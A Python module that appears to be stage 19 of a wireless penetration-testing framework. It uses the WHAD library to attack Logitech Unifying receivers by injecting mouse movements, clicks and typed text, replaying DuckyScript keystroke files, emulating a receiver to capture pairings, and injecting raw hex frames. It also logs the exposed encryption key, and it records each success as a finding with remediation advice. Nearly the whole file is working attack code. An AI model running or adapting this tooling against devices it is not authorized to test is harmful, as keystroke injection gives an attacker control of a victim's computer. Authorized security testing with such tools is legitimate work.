"""
Stage 19 — Logitech Unifying Python API

Uses the WHAD Python Unifying connectors (whad.unifying.Mouse and
whad.unifying.Keyboard) for high-fidelity injection with real synchronization
feedback — unlike the S10 CLI path which is one-shot and fire-and-forget.

  Mouse mode:
    - Mouse.synchronize() — discover device's channel and verify sync
    - Mouse.move(x, y)    — relative cursor movement
    - Mouse.left_click()  — inject left button click
    - Repeated N times per config.UNIFYING_MOUSE_MOVES

  Keyboard mode:
    - Keyboard.synchronize() — lock onto device channel
    - Keyboard.send_text()   — inject arbitrary text string
    - DuckyScript mode       — load and replay a .ducky script file

Requires an RfStorm (nRF24L01+) dongle. The WHAD Unifying Python API
operates at a lower level than the CLI tools and provides synchronization
state feedback and explicit timing control.
"""

from __future__ import annotations

import os
import time

from core.dongle import WhadDongle
from core.models import Finding
from core.db import insert_finding
from core.logger import get_logger, prompt_line
import config

log = get_logger("s19_unifying_api")

try:
    from whad.unifying import Mouse as _UniMouse, Keyboard as _UniKeyboard
    _UNIFYING_API_IMPORTABLE = True
except ImportError:
    _UniMouse = None       # type: ignore[assignment,misc]
    _UniKeyboard = None    # type: ignore[assignment,misc]
    _UNIFYING_API_IMPORTABLE = False

try:
    from whad.unifying import Dongle as _UniDongle, Injector as _UniInjector
    _UNIFYING_DONGLE_IMPORTABLE = True
except ImportError:
    _UniDongle = None      # type: ignore[assignment,misc]
    _UniInjector = None    # type: ignore[assignment,misc]
    _UNIFYING_DONGLE_IMPORTABLE = False


# ── Entry point ───────────────────────────────────────────────────────────────

def run(dongle: WhadDongle, engagement_id: str) -> None:
    if not _UNIFYING_API_IMPORTABLE:
        log.warning(
            "[S19] whad.unifying Mouse/Keyboard API not importable — "
            "install WHAD with Unifying support (pip install whad[unifying]). "
            "Skipping."
        )
        return

    if dongle.caps.device_type != "rfstorm":
        log.warning(
            "[S19] Unifying Python API works best with an RfStorm (nRF24L01+) dongle. "
            f"Current device: {dongle.caps.device_type}. Continuing anyway — "
            "synchronize() may fail if hardware is incompatible."
        )

    mode = _ask_mode()
    if mode == "mouse":
        _run_mouse(dongle, engagement_id)
    elif mode == "keyboard":
        _run_keyboard(dongle, engagement_id)
    elif mode == "ducky":
        _run_ducky(dongle, engagement_id)
    elif mode == "dongle":
        _run_dongle_emulation(dongle, engagement_id)
    elif mode == "injector":
        _run_injector(dongle, engagement_id)
    else:
        log.info("[S19] Aborted by operator.")


# ── Mouse sub-mode ────────────────────────────────────────────────────────────

def _run_mouse(dongle: WhadDongle, engagement_id: str) -> None:
    """Connect as a Unifying mouse transmitter and inject movements + clicks."""
    target_addr = _prompt_address("Mouse — enter Unifying receiver ESB address")
    if not target_addr:
        log.info("[S19][mouse] No address — aborted.")
        return

    steps = config.UNIFYING_MOUSE_MOVES
    sync_timeout = config.UNIFYING_SYNC_TIMEOUT
    synced = False
    moves_sent = 0
    clicks_sent = 0

    log.info(
        f"[S19][mouse] Synchronizing to {target_addr} "
        f"(timeout={sync_timeout}s) ..."
    )

    try:
        mouse = _UniMouse(dongle.device)
        mouse.address = target_addr

        try:
            mouse.synchronize()
            synced = True
            log.info(f"[S19][mouse] Synchronized to {target_addr}.")
        except Exception as exc:
            log.warning(
                f"[S19][mouse] synchronize() failed: {type(exc).__name__}: {exc}\n"
                "  Device may be out of range or not active."
            )
            return

        # Inject moves in a spiral pattern to make effect visible on screen
        deltas = [(20, 0), (0, 20), (-20, 0), (0, -20), (10, 10)]
        for i in range(steps):
            dx, dy = deltas[i % len(deltas)]
            try:
                mouse.move(dx, dy)
                moves_sent += 1
                log.debug(f"[S19][mouse] move({dx}, {dy}) — {moves_sent}/{steps}")
                time.sleep(0.1)
            except Exception as exc:
                log.debug(f"[S19][mouse] move error: {exc}")
                break

        # Left click
        try:
            mouse.left_click()
            clicks_sent += 1
            log.info("[S19][mouse] Left click injected.")
        except Exception as exc:
            log.debug(f"[S19][mouse] left_click error: {exc}")

        time.sleep(0.15)

        # Right click
        try:
            mouse.right_click()
            clicks_sent += 1
            log.info("[S19][mouse] Right click injected.")
        except Exception as exc:
            log.debug(f"[S19][mouse] right_click error: {exc}")

        time.sleep(0.15)

        # Middle click
        try:
            mouse.middle_click()
            clicks_sent += 1
            log.info("[S19][mouse] Middle click injected.")
        except Exception as exc:
            log.debug(f"[S19][mouse] middle_click error: {exc}")

        time.sleep(0.15)

        # Scroll demonstration — down then up
        try:
            mouse.wheel_down()
            log.info("[S19][mouse] Scroll wheel down injected.")
        except Exception as exc:
            log.debug(f"[S19][mouse] wheel_down error: {exc}")

        time.sleep(0.1)

        try:
            mouse.wheel_up()
            log.info("[S19][mouse] Scroll wheel up injected.")
        except Exception as exc:
            log.debug(f"[S19][mouse] wheel_up error: {exc}")

    except Exception as exc:
        log.warning(f"[S19][mouse] Mouse API init failed: {type(exc).__name__}: {exc}")
        return
    finally:
        try:
            mouse.stop()
        except Exception:
            pass

    inject_ok = moves_sent > 0 or clicks_sent > 0
    if inject_ok:
        finding = Finding(
            type="unifying_api_mouse_injection",
            severity="critical",
            target_addr=target_addr,
            description=(
                f"Logitech Unifying Mouse API injection succeeded against {target_addr}. "
                f"{moves_sent} cursor movement(s) and {clicks_sent} click(s) were injected "
                "via whad.unifying.Mouse after successful synchronize() — "
                "no pairing or authentication required."
            ),
            remediation=(
                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
                "Unifying receivers cannot be patched against MouseJack at the RF layer."
            ),
            evidence={
                "target_address": target_addr,
                "method": "unifying_api_mouse",
                "synchronized": synced,
                "moves_injected": moves_sent,
                "clicks_injected": clicks_sent,
            },
            engagement_id=engagement_id,
        )
        insert_finding(finding)
        log.info(
            f"FINDING [critical] unifying_api_mouse_injection: {target_addr} "
            f"({moves_sent} moves, {clicks_sent} click)"
        )

    _print_mouse_summary(target_addr, synced, moves_sent, clicks_sent)


# ── Keyboard sub-mode ─────────────────────────────────────────────────────────

def _run_keyboard(dongle: WhadDongle, engagement_id: str) -> None:
    """Synchronize as a Unifying keyboard transmitter and inject text."""
    target_addr = _prompt_address("Keyboard — enter Unifying receiver ESB address")
    if not target_addr:
        log.info("[S19][keyboard] No address — aborted.")
        return

    text = config.UNIFYING_KBD_TEXT
    locale = config.UNIFYING_LOCALE
    sync_timeout = config.UNIFYING_SYNC_TIMEOUT
    synced = False
    inject_ok = False

    log.info(
        f"[S19][keyboard] Synchronizing to {target_addr} "
        f"(timeout={sync_timeout}s) ..."
    )

    try:
        keyboard = _UniKeyboard(dongle.device)
        keyboard.address = target_addr
        if hasattr(keyboard, "locale"):
            keyboard.locale = locale

        try:
            keyboard.synchronize()
            synced = True
            log.info(f"[S19][keyboard] Synchronized to {target_addr}.")
        except Exception as exc:
            log.warning(
                f"[S19][keyboard] synchronize() failed: {type(exc).__name__}: {exc}\n"
                "  Device may be out of range or not active."
            )
            return

        try:
            enc_key = keyboard.key
            aes_ctr = keyboard.aes_counter
            if enc_key:
                log.info(f"[S19][kbd] Encryption key: {enc_key.hex()}")
                log.info(f"[S19][kbd] AES counter: {aes_ctr}")
        except AttributeError:
            log.debug("[S19][kbd] key/aes_counter not available")
        except Exception as exc:
            log.debug(f"[S19][kbd] key exposure error: {exc}")

        try:
            keyboard.send_text(text)
            inject_ok = True
            log.info(f"[S19][keyboard] Text injected: {text!r} (locale={locale})")
        except Exception as exc:
            log.warning(f"[S19][keyboard] send_text() failed: {type(exc).__name__}: {exc}")

    except Exception as exc:
        log.warning(f"[S19][keyboard] Keyboard API init failed: {type(exc).__name__}: {exc}")
        return
    finally:
        try:
            keyboard.stop()
        except Exception:
            pass

    if inject_ok:
        finding = Finding(
            type="unifying_api_keyboard_injection",
            severity="critical",
            target_addr=target_addr,
            description=(
                f"Logitech Unifying Keyboard API injection succeeded against {target_addr}. "
                f"Text {text!r} was injected via whad.unifying.Keyboard.send_text() "
                "after successful synchronize() — no pairing or authentication required."
            ),
            remediation=(
                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
                "Unifying receivers cannot be patched against MouseJack at the RF layer."
            ),
            evidence={
                "target_address": target_addr,
                "method": "unifying_api_keyboard",
                "synchronized": synced,
                "text_injected": text,
                "locale": locale,
            },
            engagement_id=engagement_id,
        )
        insert_finding(finding)
        log.info(
            f"FINDING [critical] unifying_api_keyboard_injection: {target_addr}"
        )

    _print_keyboard_summary(target_addr, synced, inject_ok, text)


# ── DuckyScript sub-mode ──────────────────────────────────────────────────────

def _run_ducky(dongle: WhadDongle, engagement_id: str) -> None:
    """Synchronize as Keyboard and replay a DuckyScript via Keyboard.send_key()."""
    target_addr = _prompt_address("Ducky — enter Unifying receiver ESB address")
    if not target_addr:
        log.info("[S19][ducky] No address — aborted.")
        return

    script_path = config.UNIFYING_DUCKY_SCRIPT
    if not script_path:
        try:
            script_path = prompt_line(
                "  DuckyScript file path: "
            ).strip()
        except (KeyboardInterrupt, EOFError):
            script_path = ""

    if not script_path or not os.path.exists(script_path):
        log.warning(
            "[S19][ducky] DuckyScript file not specified or not found. "
            "Set config.UNIFYING_DUCKY_SCRIPT."
        )
        return

    locale = config.UNIFYING_LOCALE
    synced = False
    inject_ok = False
    keys_sent = 0

    log.info(
        f"[S19][ducky] Synchronizing to {target_addr} for DuckyScript playback ..."
    )

    try:
        keyboard = _UniKeyboard(dongle.device)
        keyboard.address = target_addr
        if hasattr(keyboard, "locale"):
            keyboard.locale = locale

        try:
            keyboard.synchronize()
            synced = True
            log.info(f"[S19][ducky] Synchronized to {target_addr}.")
        except Exception as exc:
            log.warning(
                f"[S19][ducky] synchronize() failed: {type(exc).__name__}: {exc}"
            )
            return

        # Parse and replay DuckyScript
        with open(script_path) as f:
            lines = f.readlines()

        for line in lines:
            line = line.strip()
            if not line or line.startswith("//") or line.startswith("#"):
                continue
            parts = line.split(None, 1)
            cmd = parts[0].upper()
            arg = parts[1] if len(parts) > 1 else ""

            try:
                if cmd == "STRING":
                    keyboard.send_text(arg)
                    keys_sent += len(arg)
                    log.debug(f"[S19][ducky] STRING: {arg!r}")
                elif cmd in ("ENTER", "RETURN"):
                    keyboard.send_key("ENTER")
                    keys_sent += 1
                elif cmd == "DELAY":
                    try:
                        time.sleep(int(arg) / 1000.0)
                    except ValueError:
                        pass
                elif cmd in ("WINDOWS", "GUI"):
                    keyboard.send_key("WINDOWS", arg.upper() if arg else None)
                    keys_sent += 1
                elif cmd in ("CTRL", "CONTROL"):
                    keyboard.send_key("CTRL", arg.upper() if arg else None)
                    keys_sent += 1
                elif cmd == "ALT":
                    keyboard.send_key("ALT", arg.upper() if arg else None)
                    keys_sent += 1
                elif cmd == "SHIFT":
                    keyboard.send_key("SHIFT", arg.upper() if arg else None)
                    keys_sent += 1
                elif cmd in ("TAB",):
                    keyboard.send_key("TAB")
                    keys_sent += 1
                elif cmd in ("ESCAPE", "ESC"):
                    keyboard.send_key("ESCAPE")
                    keys_sent += 1
                elif cmd in ("VOLUME_UP", "VOLUMEUP"):
                    try:
                        keyboard.volume_up()
                    except AttributeError:
                        pass
                elif cmd in ("VOLUME_DOWN", "VOLUMEDOWN"):
                    try:
                        keyboard.volume_down()
                    except AttributeError:
                        pass
                elif cmd in ("VOLUME_MUTE", "MUTE"):
                    try:
                        keyboard.volume_toggle()
                    except AttributeError:
                        pass
                # Unknown command: skip silently
            except Exception as exc:
                log.debug(f"[S19][ducky] cmd {cmd!r}: {exc}")

        inject_ok = keys_sent > 0

    except Exception as exc:
        log.warning(f"[S19][ducky] Keyboard API failed: {type(exc).__name__}: {exc}")
        return
    finally:
        try:
            keyboard.stop()
        except Exception:
            pass

    if inject_ok:
        finding = Finding(
            type="unifying_api_ducky_injection",
            severity="critical",
            target_addr=target_addr,
            description=(
                f"DuckyScript playback via Unifying Keyboard API succeeded against "
                f"{target_addr}. {keys_sent} keystroke(s) from "
                f"{os.path.basename(script_path)!r} were injected after "
                "successful synchronize() — no pairing required."
            ),
            remediation=(
                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
                "Unifying receivers cannot be patched against MouseJack at the RF layer."
            ),
            evidence={
                "target_address": target_addr,
                "method": "unifying_api_ducky",
                "synchronized": synced,
                "script_file": os.path.basename(script_path),
                "keys_injected": keys_sent,
                "locale": locale,
            },
            engagement_id=engagement_id,
        )
        insert_finding(finding)
        log.info(
            f"FINDING [critical] unifying_api_ducky_injection: {target_addr} "
            f"({keys_sent} keys from {os.path.basename(script_path)!r})"
        )

    log.info("─" * 76)
    log.info("STAGE 19 SUMMARY -- Unifying API / DuckyScript")
    log.info(f"  Target address        : {target_addr}")
    log.info(f"  Synchronized          : {'yes' if synced else 'no'}")
    log.info(f"  Script                : {os.path.basename(script_path)}")
    log.info(f"  Keys injected         : {keys_sent}")
    log.info("─" * 76)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _ask_mode() -> str:
    log.info("Stage 19 — Logitech Unifying Python API:")
    log.info("  [M] Mouse    — sync + inject cursor moves + click")
    log.info("  [K] Keyboard — sync + inject text string")
    log.info("  [D] Ducky    — sync + replay DuckyScript file")
    log.info("  [E] Dongle   — emulate Unifying receiver for pairing capture")
    log.info("  [I] Injector — inject a raw Unifying frame by hex payload")
    log.info("  [S] Skip")
    while True:
        try:
            c = prompt_line("  Select [M/K/D/E/I/S]: ").strip().upper()
        except (KeyboardInterrupt, EOFError):
            return "skip"
        if c == "M":
            return "mouse"
        if c == "K":
            return "keyboard"
        if c == "D":
            return "ducky"
        if c == "E":
            return "dongle"
        if c == "I":
            return "injector"
        if c in ("S", ""):
            return "skip"
        log.warning("  Please enter M, K, D, E, I, or S.")


def _prompt_address(prompt: str) -> str | None:
    log.info(f"  {prompt}")
    log.info("  Format: XX:XX:XX:XX:XX (5-byte hex, e.g. 29:b9:81:2c:a4)")
    try:
        raw = prompt_line("  ESB address [empty to abort]: ").strip()
    except (KeyboardInterrupt, EOFError):
        return None
    return raw.lower() if raw else None


def _print_mouse_summary(
    addr: str, synced: bool, moves: int, clicks: int
) -> None:
    result = "SUCCESS" if (moves > 0 or clicks > 0) else "FAILED"
    log.info("─" * 76)
    log.info("STAGE 19 SUMMARY -- Unifying API / Mouse Injection")
    log.info(f"  Target address        : {addr}")
    log.info(f"  Synchronized          : {'yes' if synced else 'no'}")
    log.info(f"  Moves injected        : {moves}")
    log.info(f"  Clicks injected       : {clicks}")
    log.info(f"  Result                : {result}")
    log.info("─" * 76)


def _print_keyboard_summary(
    addr: str, synced: bool, inject_ok: bool, text: str
) -> None:
    log.info("─" * 76)
    log.info("STAGE 19 SUMMARY -- Unifying API / Keyboard Injection")
    log.info(f"  Target address        : {addr}")
    log.info(f"  Synchronized          : {'yes' if synced else 'no'}")
    log.info(f"  Text injected         : {text!r}")
    log.info(f"  Result                : {'SUCCESS' if inject_ok else 'FAILED'}")
    log.info("─" * 76)


# ── Dongle emulation sub-mode ─────────────────────────────────────────────────

def _run_dongle_emulation(dongle: WhadDongle, engagement_id: str) -> None:
    """Emulate a Unifying receiver to capture device pairing."""
    if not _UNIFYING_DONGLE_IMPORTABLE:
        log.warning(
            "[S19][dongle] whad.unifying.Dongle not importable — "
            "install WHAD with Unifying support. Skipping."
        )
        return

    target_addr = _prompt_address("Dongle emulation — enter Unifying ESB address to emulate")
    if not target_addr:
        log.info("[S19][dongle] No address — aborted.")
        return

    timeout = config.UNIFYING_SYNC_TIMEOUT
    paired = _emulate_unifying_dongle(dongle, target_addr, timeout=timeout)

    log.info("─" * 76)
    log.info("STAGE 19 SUMMARY -- Unifying API / Dongle Emulation")
    log.info(f"  Target address        : {target_addr}")
    log.info(f"  Timeout               : {timeout}s")
    log.info(f"  Device paired         : {'yes' if paired else 'no'}")
    log.info("─" * 76)

    if paired:
        finding = Finding(
            type="unifying_api_dongle_pairing_capture",
            severity="high",
            target_addr=target_addr,
            description=(
                f"Unifying dongle emulation captured a device pairing event from {target_addr}. "
                "A peripheral actively paired with the emulated receiver — "
                "pairing frames may contain linkable credentials."
            ),
            remediation=(
                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
                "Ensure devices are only paired in physically secure environments."
            ),
            evidence={
                "target_address": target_addr,
                "method": "unifying_api_dongle_emulation",
                "paired": paired,
            },
            engagement_id=engagement_id,
        )
        insert_finding(finding)
        log.info(f"FINDING [high] unifying_api_dongle_pairing_capture: {target_addr}")


# ── Raw injector sub-mode ─────────────────────────────────────────────────────

def _run_injector(dongle: WhadDongle, engagement_id: str) -> None:
    """Inject a raw Unifying frame by hex payload."""
    if not _UNIFYING_DONGLE_IMPORTABLE:
        log.warning(
            "[S19][inject] whad.unifying.Injector not importable — "
            "install WHAD with Unifying support. Skipping."
        )
        return

    target_addr = _prompt_address("Injector — enter Unifying receiver ESB address")
    if not target_addr:
        log.info("[S19][inject] No address — aborted.")
        return

    try:
        payload_hex = prompt_line("  Hex payload to inject (e.g. 050000000000): ").strip()
    except (KeyboardInterrupt, EOFError):
        log.info("[S19][inject] Aborted.")
        return

    if not payload_hex:
        log.info("[S19][inject] No payload — aborted.")
        return

    ok = _inject_unifying_frame(dongle, target_addr, payload_hex)

    log.info("─" * 76)
    log.info("STAGE 19 SUMMARY -- Unifying API / Raw Frame Injection")
    log.info(f"  Target address        : {target_addr}")
    log.info(f"  Payload               : {payload_hex}")
    log.info(f"  Result                : {'SUCCESS' if ok else 'FAILED'}")
    log.info("─" * 76)

    if ok:
        finding = Finding(
            type="unifying_api_raw_frame_injection",
            severity="high",
            target_addr=target_addr,
            description=(
                f"Raw Unifying frame injected to {target_addr} via whad.unifying.Injector. "
                f"Payload: {payload_hex}. No pairing or authentication required."
            ),
            remediation=(
                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
                "Unifying receivers cannot be patched against raw frame injection at the RF layer."
            ),
            evidence={
                "target_address": target_addr,
                "method": "unifying_api_injector",
                "payload_hex": payload_hex,
            },
            engagement_id=engagement_id,
        )
        insert_finding(finding)
        log.info(f"FINDING [high] unifying_api_raw_frame_injection: {target_addr}")


# ── Low-level helpers (callable from external stages) ─────────────────────────

def _emulate_unifying_dongle(dongle: WhadDongle, target_addr: str, timeout: int = 30) -> bool:
    """Emulate a Unifying receiver dongle to capture device pairing.

    Uses whad.unifying.Dongle connector. Returns True if a device paired,
    False on failure or unsupported hardware.
    """
    try:
        from whad.unifying import Dongle
    except ImportError:
        log.debug("[S19][dongle] whad.unifying.Dongle not importable")
        return False

    log.info(f"[S19][dongle] Starting dongle emulation for {timeout}s")
    dongle_connector = None
    try:
        dongle_connector = Dongle(dongle.device)
        dongle_connector.address = target_addr
        dongle_connector.start()
        from time import time as _time
        deadline = _time() + timeout
        while _time() < deadline:
            remaining = deadline - _time()
            try:
                pkt = dongle_connector.wait_packet(timeout=min(remaining, 1.0))
                if pkt is not None:
                    log.info(f"[S19][dongle] Paired device packet: {bytes(pkt).hex()}")
                    return True
            except Exception:
                break
    except AttributeError:
        log.debug("[S19][dongle] Dongle connector not available on this hardware")
    except Exception as exc:
        log.debug(f"[S19][dongle] Dongle emulation error: {exc}")
    finally:
        if dongle_connector is not None:
            try:
                dongle_connector.stop()
            except Exception:
                pass
    return False


def _inject_unifying_frame(dongle: WhadDongle, target_addr: str, payload_hex: str) -> bool:
    """Inject a raw Unifying frame using whad.unifying.Injector.

    Returns True on success, False on failure or unsupported hardware.
    """
    try:
        from whad.unifying import Injector
    except ImportError:
        log.debug("[S19][inject] whad.unifying.Injector not importable")
        return False

    injector = None
    try:
        injector = Injector(dongle.device)
        injector.address = target_addr
        payload = bytes.fromhex(payload_hex)
        injector.inject(payload)
        log.info(f"[S19][inject] Frame injected: {payload_hex}")
        return True
    except AttributeError:
        log.debug("[S19][inject] Injector not available on this hardware")
    except Exception as exc:
        log.debug(f"[S19][inject] Inject error: {exc}")
    finally:
        if injector is not None:
            try:
                injector.stop()
            except Exception:
                pass
    return False
